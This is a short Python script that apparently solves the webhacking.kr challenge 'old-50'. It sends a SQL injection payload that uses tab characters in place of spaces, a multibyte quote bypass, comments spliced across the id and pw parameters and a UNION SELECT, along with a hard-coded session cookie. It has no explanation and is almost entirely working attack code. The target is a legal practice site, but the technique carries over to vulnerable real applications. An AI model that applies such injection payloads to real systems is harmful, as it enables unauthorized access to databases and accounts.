import requests

url = "https://webhacking.kr/challenge/web-25/?"
cookie = {"PHPSESSID":"ke8h3bkd8uil120pco31vkasb5"}

def solve():
    payload = "id=admin%09%aa%27/*&pw=*/%09union%09select%093%23"
    res = requests.get(url=url+payload,cookies=cookie)
    if "old-50 Pwned!" in res.text:
        print("old-50 Pwned!")
    elif "already solve" in res.text:
        print("already solve")
        
if __name__ == "__main__":
    solve()